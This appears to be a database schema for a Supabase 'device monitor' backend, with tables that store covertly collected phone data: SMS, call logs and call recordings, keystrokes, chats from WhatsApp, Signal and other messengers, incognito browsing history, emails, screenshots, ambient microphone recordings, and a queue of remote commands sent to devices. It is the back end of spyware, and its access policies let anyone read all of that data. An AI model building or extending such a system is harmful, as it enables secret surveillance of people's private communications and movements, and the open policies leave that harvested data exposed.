-- =============================================
-- IMPROVED COMPLETE SCHEMA FOR DEVICE MONITOR
-- =============================================
-- Addresses limitations of original schema:
-- 1. Added NOT NULL constraints on critical columns
-- 2. Added CHECK constraints to validate data
-- 3. Added UNIQUE constraints to prevent duplicates
-- 4. Added indexes for faster queries
-- 5. Added updated_at columns for tracking changes
-- 6. Added Cloudinary-specific columns
-- 7. Added missing metadata columns
-- 8. Added remote commands table
-- =============================================

-- Enable extensions
CREATE EXTENSION IF NOT EXISTS "uuid-ossp";
-- Note: earthdistance and cube are not enabled by default in all Supabase tiers, so skipping them

-- =============================================
-- 1. DEVICES TABLE (Improved)
-- =============================================
DROP TABLE IF EXISTS devices CASCADE;
CREATE TABLE devices (
    id UUID DEFAULT uuid_generate_v4() PRIMARY KEY,
    device_name TEXT NOT NULL,
    device_token TEXT NOT NULL UNIQUE,
    device_model TEXT,
    os_version TEXT,
    battery_level INTEGER CHECK (battery_level BETWEEN 0 AND 100),
    is_charging BOOLEAN DEFAULT FALSE,
    last_seen TIMESTAMP WITH TIME ZONE,
    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    updated_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Indexes for devices
CREATE INDEX idx_devices_token ON devices(device_token);
CREATE INDEX idx_devices_last_seen ON devices(last_seen DESC);

-- =============================================
-- 2. LOCATIONS TABLE (Improved)
-- =============================================
DROP TABLE IF EXISTS locations CASCADE;
CREATE TABLE locations (
    id UUID DEFAULT uuid_generate_v4() PRIMARY KEY,
    device_id UUID NOT NULL REFERENCES devices(id) ON DELETE CASCADE,
    latitude DOUBLE PRECISION NOT NULL CHECK (latitude BETWEEN -90 AND 90),
    longitude DOUBLE PRECISION NOT NULL CHECK (longitude BETWEEN -180 AND 180),
    accuracy REAL, -- meters
    altitude REAL, -- meters
    speed REAL, -- m/s
    provider TEXT, -- "gps", "network", "passive"
    battery_level INTEGER CHECK (battery_level BETWEEN 0 AND 100),
    is_charging BOOLEAN DEFAULT FALSE,
    recorded_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Indexes for locations
CREATE INDEX idx_locations_device_id ON locations(device_id);
CREATE INDEX idx_locations_recorded_at ON locations(recorded_at DESC);
-- Indexes for latitude/longitude for faster range queries
CREATE INDEX idx_locations_lat ON locations(latitude);
CREATE INDEX idx_locations_lng ON locations(longitude);

-- =============================================
-- 3. CALL LOGS TABLE (Improved)
-- =============================================
DROP TABLE IF EXISTS call_logs CASCADE;
CREATE TABLE call_logs (
    id UUID DEFAULT uuid_generate_v4() PRIMARY KEY,
    device_id UUID NOT NULL REFERENCES devices(id) ON DELETE CASCADE,
    contact_name TEXT,
    phone_number TEXT NOT NULL,
    call_type TEXT NOT NULL CHECK (call_type IN ('incoming', 'outgoing', 'missed', 'rejected')),
    duration_seconds INTEGER CHECK (duration_seconds >= 0),
    call_timestamp TIMESTAMP WITH TIME ZONE NOT NULL,
    is_read BOOLEAN DEFAULT FALSE,
    recorded_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Indexes for call logs
CREATE INDEX idx_call_logs_device_id ON call_logs(device_id);
CREATE INDEX idx_call_logs_timestamp ON call_logs(call_timestamp DESC);
CREATE INDEX idx_call_logs_phone ON call_logs(phone_number);

-- =============================================
-- 4. SMS TABLE (Improved)
-- =============================================
DROP TABLE IF EXISTS sms CASCADE;
CREATE TABLE sms (
    id UUID DEFAULT uuid_generate_v4() PRIMARY KEY,
    device_id UUID NOT NULL REFERENCES devices(id) ON DELETE CASCADE,
    contact_name TEXT,
    phone_number TEXT NOT NULL,
    message_type TEXT NOT NULL CHECK (message_type IN ('sent', 'received', 'draft')),
    content TEXT NOT NULL,
    is_read BOOLEAN DEFAULT FALSE,
    is_deleted BOOLEAN DEFAULT FALSE,
    sms_timestamp TIMESTAMP WITH TIME ZONE NOT NULL,
    recorded_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Indexes for sms
CREATE INDEX idx_sms_device_id ON sms(device_id);
CREATE INDEX idx_sms_timestamp ON sms(sms_timestamp DESC);
CREATE INDEX idx_sms_phone ON sms(phone_number);

-- =============================================
-- 5. MESSENGER MESSAGES TABLE (Improved)
-- =============================================
DROP TABLE IF EXISTS messenger_messages CASCADE;
CREATE TABLE messenger_messages (
    id UUID DEFAULT uuid_generate_v4() PRIMARY KEY,
    device_id UUID NOT NULL REFERENCES devices(id) ON DELETE CASCADE,
    messenger_type TEXT NOT NULL CHECK (
        messenger_type IN (
            'whatsapp', 'telegram', 'instagram', 'facebook', 'snapchat',
            'google_chat', 'tiktok', 'vsco', 'signal', 'wechat', 'line',
            'viber', 'discord', 'skype'
        )
    ),
    conversation_id TEXT, -- Unique ID for chat thread
    contact_name TEXT,
    contact_username TEXT,
    content TEXT,
    media_url TEXT, -- Cloudinary URL for media (photos/videos)
    media_type TEXT CHECK (media_type IN ('photo', 'video', 'audio', 'document')),
    message_type TEXT NOT NULL CHECK (message_type IN ('sent', 'received')),
    is_read BOOLEAN DEFAULT FALSE,
    is_deleted BOOLEAN DEFAULT FALSE,
    message_timestamp TIMESTAMP WITH TIME ZONE NOT NULL,
    recorded_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Indexes for messenger messages
CREATE INDEX idx_messenger_device_id ON messenger_messages(device_id);
CREATE INDEX idx_messenger_type ON messenger_messages(messenger_type);
CREATE INDEX idx_messenger_timestamp ON messenger_messages(message_timestamp DESC);

-- =============================================
-- 6. WEB HISTORY TABLE (Improved)
-- =============================================
DROP TABLE IF EXISTS web_history CASCADE;
CREATE TABLE web_history (
    id UUID DEFAULT uuid_generate_v4() PRIMARY KEY,
    device_id UUID NOT NULL REFERENCES devices(id) ON DELETE CASCADE,
    url TEXT NOT NULL,
    domain TEXT, -- Extracted from URL
    title TEXT,
    entry_time TIMESTAMP WITH TIME ZONE NOT NULL,
    exit_time TIMESTAMP WITH TIME ZONE,
    duration_seconds BIGINT CHECK (duration_seconds >= 0),
    browsing_mode TEXT NOT NULL DEFAULT 'standard' CHECK (browsing_mode IN ('standard', 'incognito')),
    browser_name TEXT, -- Chrome, Firefox, etc.
    recorded_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Indexes for web history
CREATE INDEX idx_web_history_device_id ON web_history(device_id);
CREATE INDEX idx_web_history_domain ON web_history(domain);
CREATE INDEX idx_web_history_entry ON web_history(entry_time DESC);

-- =============================================
-- 7. APP USAGE TABLE (Improved)
-- =============================================
DROP TABLE IF EXISTS app_usage CASCADE;
CREATE TABLE app_usage (
    id UUID DEFAULT uuid_generate_v4() PRIMARY KEY,
    device_id UUID NOT NULL REFERENCES devices(id) ON DELETE CASCADE,
    package_name TEXT NOT NULL,
    app_name TEXT,
    version_name TEXT,
    usage_time_seconds INTEGER NOT NULL CHECK (usage_time_seconds >= 0),
    last_used_at TIMESTAMP WITH TIME ZONE,
    recorded_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Indexes for app usage
CREATE INDEX idx_app_usage_device_id ON app_usage(device_id);
CREATE INDEX idx_app_usage_package ON app_usage(package_name);
CREATE INDEX idx_app_usage_recorded ON app_usage(recorded_at DESC);

-- =============================================
-- 8. PHOTOS TABLE (Improved with Cloudinary)
-- =============================================
DROP TABLE IF EXISTS photos CASCADE;
CREATE TABLE photos (
    id UUID DEFAULT uuid_generate_v4() PRIMARY KEY,
    device_id UUID NOT NULL REFERENCES devices(id) ON DELETE CASCADE,
    cloudinary_public_id TEXT NOT NULL UNIQUE,
    photo_url TEXT NOT NULL,
    thumbnail_url TEXT,
    file_size_bytes BIGINT CHECK (file_size_bytes >= 0),
    width INTEGER,
    height INTEGER,
    mime_type TEXT,
    taken_at TIMESTAMP WITH TIME ZONE,
    recorded_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Indexes for photos
CREATE INDEX idx_photos_device_id ON photos(device_id);
CREATE INDEX idx_photos_recorded ON photos(recorded_at DESC);

-- =============================================
-- 9. SCREENSHOTS TABLE (Improved with Cloudinary)
-- =============================================
DROP TABLE IF EXISTS screenshots CASCADE;
CREATE TABLE screenshots (
    id UUID DEFAULT uuid_generate_v4() PRIMARY KEY,
    device_id UUID NOT NULL REFERENCES devices(id) ON DELETE CASCADE,
    cloudinary_public_id TEXT NOT NULL UNIQUE,
    screenshot_url TEXT NOT NULL,
    thumbnail_url TEXT,
    file_size_bytes BIGINT CHECK (file_size_bytes >= 0),
    width INTEGER,
    height INTEGER,
    taken_at TIMESTAMP WITH TIME ZONE,
    recorded_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Indexes for screenshots
CREATE INDEX idx_screenshots_device_id ON screenshots(device_id);
CREATE INDEX idx_screenshots_recorded ON screenshots(recorded_at DESC);

-- =============================================
-- 10. KEYSTROKES TABLE (Improved)
-- =============================================
DROP TABLE IF EXISTS keystrokes CASCADE;
CREATE TABLE keystrokes (
    id UUID DEFAULT uuid_generate_v4() PRIMARY KEY,
    device_id UUID NOT NULL REFERENCES devices(id) ON DELETE CASCADE,
    text_content TEXT NOT NULL,
    app_name TEXT,
    package_name TEXT,
    keystroke_timestamp TIMESTAMP WITH TIME ZONE NOT NULL,
    recorded_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Indexes for keystrokes
CREATE INDEX idx_keystrokes_device_id ON keystrokes(device_id);
CREATE INDEX idx_keystrokes_timestamp ON keystrokes(keystroke_timestamp DESC);

-- =============================================
-- 11. SIM CHANGES TABLE (Improved)
-- =============================================
DROP TABLE IF EXISTS sim_changes CASCADE;
CREATE TABLE sim_changes (
    id UUID DEFAULT uuid_generate_v4() PRIMARY KEY,
    device_id UUID NOT NULL REFERENCES devices(id) ON DELETE CASCADE,
    old_imsi TEXT,
    new_imsi TEXT,
    old_operator TEXT,
    new_operator TEXT,
    sim_slot INTEGER CHECK (sim_slot IN (1, 2)),
    recorded_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Indexes for sim changes
CREATE INDEX idx_sim_changes_device_id ON sim_changes(device_id);
CREATE INDEX idx_sim_changes_recorded ON sim_changes(recorded_at DESC);

-- =============================================
-- 12. CONTACTS TABLE (Improved)
-- =============================================
DROP TABLE IF EXISTS contacts CASCADE;
CREATE TABLE contacts (
    id UUID DEFAULT uuid_generate_v4() PRIMARY KEY,
    device_id UUID NOT NULL REFERENCES devices(id) ON DELETE CASCADE,
    contact_id TEXT NOT NULL, -- Device's contact ID
    display_name TEXT NOT NULL,
    phone_numbers TEXT[],
    emails TEXT[],
    photo_uri TEXT,
    cloudinary_photo_id TEXT,
    starred BOOLEAN DEFAULT FALSE,
    organization TEXT,
    job_title TEXT,
    recorded_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    UNIQUE(device_id, contact_id)
);

-- Indexes for contacts
CREATE INDEX idx_contacts_device_id ON contacts(device_id);
CREATE INDEX idx_contacts_name ON contacts USING GIN (to_tsvector('english', display_name));

-- =============================================
-- 13. CALL RECORDINGS TABLE (Improved with Cloudinary)
-- =============================================
DROP TABLE IF EXISTS call_recordings CASCADE;
CREATE TABLE call_recordings (
    id UUID DEFAULT uuid_generate_v4() PRIMARY KEY,
    device_id UUID NOT NULL REFERENCES devices(id) ON DELETE CASCADE,
    cloudinary_public_id TEXT NOT NULL UNIQUE,
    file_url TEXT NOT NULL,
    contact_name TEXT,
    phone_number TEXT,
    call_type TEXT NOT NULL CHECK (call_type IN ('incoming', 'outgoing')),
    duration_seconds BIGINT CHECK (duration_seconds >= 0),
    file_size_bytes BIGINT CHECK (file_size_bytes >= 0),
    call_timestamp TIMESTAMP WITH TIME ZONE NOT NULL,
    recorded_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Indexes for call recordings
CREATE INDEX idx_call_recordings_device_id ON call_recordings(device_id);
CREATE INDEX idx_call_recordings_timestamp ON call_recordings(call_timestamp DESC);

-- =============================================
-- 14. EMAIL ENTRIES TABLE (Improved)
-- =============================================
DROP TABLE IF EXISTS email_entries CASCADE;
CREATE TABLE email_entries (
    id UUID DEFAULT uuid_generate_v4() PRIMARY KEY,
    device_id UUID NOT NULL REFERENCES devices(id) ON DELETE CASCADE,
    from_address TEXT NOT NULL,
    to_addresses TEXT[],
    cc_addresses TEXT[],
    bcc_addresses TEXT[],
    subject TEXT,
    body TEXT,
    is_read BOOLEAN DEFAULT FALSE,
    email_timestamp TIMESTAMP WITH TIME ZONE NOT NULL,
    recorded_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Indexes for email entries
CREATE INDEX idx_email_entries_device_id ON email_entries(device_id);
CREATE INDEX idx_email_entries_timestamp ON email_entries(email_timestamp DESC);

-- =============================================
-- 15. AMBIENT RECORDINGS TABLE (Improved with Cloudinary)
-- =============================================
DROP TABLE IF EXISTS ambient_recordings CASCADE;
CREATE TABLE ambient_recordings (
    id UUID DEFAULT uuid_generate_v4() PRIMARY KEY,
    device_id UUID NOT NULL REFERENCES devices(id) ON DELETE CASCADE,
    cloudinary_public_id TEXT NOT NULL UNIQUE,
    file_url TEXT NOT NULL,
    duration_seconds BIGINT CHECK (duration_seconds >= 0),
    file_size_bytes BIGINT CHECK (file_size_bytes >= 0),
    recorded_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Indexes for ambient recordings
CREATE INDEX idx_ambient_recordings_device_id ON ambient_recordings(device_id);
CREATE INDEX idx_ambient_recordings_recorded ON ambient_recordings(recorded_at DESC);

-- =============================================
-- 16. SCREEN RECORDINGS TABLE (Improved with Cloudinary)
-- =============================================
DROP TABLE IF EXISTS screen_recordings CASCADE;
CREATE TABLE screen_recordings (
    id UUID DEFAULT uuid_generate_v4() PRIMARY KEY,
    device_id UUID NOT NULL REFERENCES devices(id) ON DELETE CASCADE,
    cloudinary_public_id TEXT NOT NULL UNIQUE,
    file_url TEXT NOT NULL,
    duration_seconds BIGINT CHECK (duration_seconds >= 0),
    file_size_bytes BIGINT CHECK (file_size_bytes >= 0),
    recorded_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Indexes for screen recordings
CREATE INDEX idx_screen_recordings_device_id ON screen_recordings(device_id);
CREATE INDEX idx_screen_recordings_recorded ON screen_recordings(recorded_at DESC);

-- =============================================
-- 17. RISK ALERTS TABLE (Improved)
-- =============================================
DROP TABLE IF EXISTS risk_alerts CASCADE;
CREATE TABLE risk_alerts (
    id UUID DEFAULT uuid_generate_v4() PRIMARY KEY,
    device_id UUID NOT NULL REFERENCES devices(id) ON DELETE CASCADE,
    alert_type TEXT NOT NULL CHECK (
        alert_type IN (
            'sensitive_keyword', 'suspicious_location',
            'unknown_contact', 'excessive_usage'
        )
    ),
    severity TEXT NOT NULL CHECK (severity IN ('low', 'medium', 'high', 'critical')),
    description TEXT NOT NULL,
    source TEXT,
    content TEXT,
    is_resolved BOOLEAN DEFAULT FALSE,
    recorded_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Indexes for risk alerts
CREATE INDEX idx_risk_alerts_device_id ON risk_alerts(device_id);
CREATE INDEX idx_risk_alerts_severity ON risk_alerts(severity);
CREATE INDEX idx_risk_alerts_resolved ON risk_alerts(is_resolved);
CREATE INDEX idx_risk_alerts_recorded ON risk_alerts(recorded_at DESC);

-- =============================================
-- 18. REMOTE COMMANDS TABLE (NEW!)
-- =============================================
DROP TABLE IF EXISTS commands CASCADE;
CREATE TABLE commands (
    id UUID DEFAULT uuid_generate_v4() PRIMARY KEY,
    device_id UUID NOT NULL REFERENCES devices(id) ON DELETE CASCADE,
    command TEXT NOT NULL,
    payload TEXT,
    status TEXT NOT NULL DEFAULT 'pending' CHECK (status IN ('pending', 'executing', 'completed', 'failed')),
    result TEXT,
    executed_at TIMESTAMP WITH TIME ZONE,
    recorded_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    updated_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Indexes for commands
CREATE INDEX idx_commands_device_id ON commands(device_id);
CREATE INDEX idx_commands_status ON commands(status);
CREATE INDEX idx_commands_recorded ON commands(recorded_at DESC);

-- =============================================
-- ROW LEVEL SECURITY (RLS) POLICIES
-- =============================================
ALTER TABLE devices ENABLE ROW LEVEL SECURITY;
ALTER TABLE locations ENABLE ROW LEVEL SECURITY;
ALTER TABLE call_logs ENABLE ROW LEVEL SECURITY;
ALTER TABLE sms ENABLE ROW LEVEL SECURITY;
ALTER TABLE messenger_messages ENABLE ROW LEVEL SECURITY;
ALTER TABLE web_history ENABLE ROW LEVEL SECURITY;
ALTER TABLE app_usage ENABLE ROW LEVEL SECURITY;
ALTER TABLE photos ENABLE ROW LEVEL SECURITY;
ALTER TABLE screenshots ENABLE ROW LEVEL SECURITY;
ALTER TABLE keystrokes ENABLE ROW LEVEL SECURITY;
ALTER TABLE sim_changes ENABLE ROW LEVEL SECURITY;
ALTER TABLE contacts ENABLE ROW LEVEL SECURITY;
ALTER TABLE call_recordings ENABLE ROW LEVEL SECURITY;
ALTER TABLE email_entries ENABLE ROW LEVEL SECURITY;
ALTER TABLE ambient_recordings ENABLE ROW LEVEL SECURITY;
ALTER TABLE screen_recordings ENABLE ROW LEVEL SECURITY;
ALTER TABLE risk_alerts ENABLE ROW LEVEL SECURITY;
ALTER TABLE commands ENABLE ROW LEVEL SECURITY;

-- Demo policies (allow all for testing - replace with proper policies in production!)
CREATE POLICY "Allow all on devices" ON devices FOR ALL USING (true);
CREATE POLICY "Allow all on locations" ON locations FOR ALL USING (true);
CREATE POLICY "Allow all on call_logs" ON call_logs FOR ALL USING (true);
CREATE POLICY "Allow all on sms" ON sms FOR ALL USING (true);
CREATE POLICY "Allow all on messenger_messages" ON messenger_messages FOR ALL USING (true);
CREATE POLICY "Allow all on web_history" ON web_history FOR ALL USING (true);
CREATE POLICY "Allow all on app_usage" ON app_usage FOR ALL USING (true);
CREATE POLICY "Allow all on photos" ON photos FOR ALL USING (true);
CREATE POLICY "Allow all on screenshots" ON screenshots FOR ALL USING (true);
CREATE POLICY "Allow all on keystrokes" ON keystrokes FOR ALL USING (true);
CREATE POLICY "Allow all on sim_changes" ON sim_changes FOR ALL USING (true);
CREATE POLICY "Allow all on contacts" ON contacts FOR ALL USING (true);
CREATE POLICY "Allow all on call_recordings" ON call_recordings FOR ALL USING (true);
CREATE POLICY "Allow all on email_entries" ON email_entries FOR ALL USING (true);
CREATE POLICY "Allow all on ambient_recordings" ON ambient_recordings FOR ALL USING (true);
CREATE POLICY "Allow all on screen_recordings" ON screen_recordings FOR ALL USING (true);
CREATE POLICY "Allow all on risk_alerts" ON risk_alerts FOR ALL USING (true);
CREATE POLICY "Allow all on commands" ON commands FOR ALL USING (true);

-- =============================================
-- END OF SCHEMA
-- =============================================
